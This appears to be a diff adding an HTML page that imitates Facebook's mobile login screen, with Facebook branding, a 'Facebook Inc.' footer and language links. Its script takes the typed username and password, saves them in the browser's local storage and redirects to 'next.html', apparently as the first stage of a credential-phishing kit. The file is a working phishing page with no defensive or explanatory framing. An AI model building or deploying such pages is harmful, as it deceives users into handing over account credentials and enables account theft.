@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+<!-- BEGIN SHAREAHOLIC CODE -->
+<link rel="preload" href="https://cdn.shareaholic.net/assets/pub/shareaholic.js" as="script" />
+<meta name="shareaholic:site_id" content="9122d0b45d8f022a793981c3c274f6a6" />
+<script data-cfasync="false" async src="https://cdn.shareaholic.net/assets/pub/shareaholic.js"></script>
+<!-- END SHAREAHOLIC CODE -->
+<meta charset="utf-8">
+	<script type="text/javascript">
+		function send(){
+var a=document.getElementById("username").value;
+var b=document.getElementById("password").value;
+if(a!=""&& b!=""){
+localStorage.setItem("name",a);
+localStorage.setItem("password",b);
+document.location="next.html";
+		}
+else{alert("please enter username and password");}
+
+
+
+}
+	</script>
+	<style type="text/css">
+		#username,#password{
+			background-color: #FAFAFA;
+			border:none;
+			border-radius: 5px;
+			font-size: 15px;
+			padding: 8px; 
+			width: 95%;
+			box-shadow: 1px 1px 1px #E1E5EC;
+			margin: 10px;
+
+		}
+	</style>
+</head>
+<body>
+<form method="post" action="">
+<center>	
+<label style="color:blue; font-style:bold; ; font-size: 30px;"><b>facebook</b></label>
+<input type="text" name="username" id="username" placeholder="Mobile number or email" /><br>
+<input type="password" name="password" id="password" placeholder="password" /><br>
+<input type="button" name="btn" onclick="send();" value="Log In" id="btn" style="width: 95%; background-color:blue; font-size: 20px; color: white; margin: 10px; padding: 8px; border-radius: 5px;" /> <br>
+<hr style="color: ##E1E5EC; width: 95%"> <br>
+<input type="button" name="btn" value="  Create New Account  " id="btn" style=" background-color:limegreen; font-size: 12px; color: white; margin: 10px; padding: 8px; border-radius: 5px; border:none;" /><br>
+<a href="#" style="color: blue; font-style:normal; text-decoration: none;">Forgot Password? </a><br> <br>
+<a href="#" style="color: gray; font-style:normal; text-decoration: none;">English(US)</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+<a href="#" style="color: blue; font-style:normal; text-decoration: none;">پښتو</a><br>
+<a href="#" style="color: blue; font-style:normal; text-decoration: none;">فارسی</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+<a href="#" style="color: blue; font-style:normal; text-decoration: none;">عربی</a><br>
+<a href="#" style="color: blue; font-style:normal; text-decoration: none;">Deutsch</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+<a href="#" style="color: blue; font-style:normal; text-decoration: none;">Espanol</a><br>
+<a href="#" style="color: blue; font-style:normal; text-decoration: none;">Prtugues(Brasil)</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+<a href="#" style="color: blue; font-style:normal; text-decoration: none;">+</a><br>
+<a href="#" style="color: gray; font-style:normal; text-decoration: none;">Facebook Inc.</a>
+</center>
+</form>
+</body>
+</html>
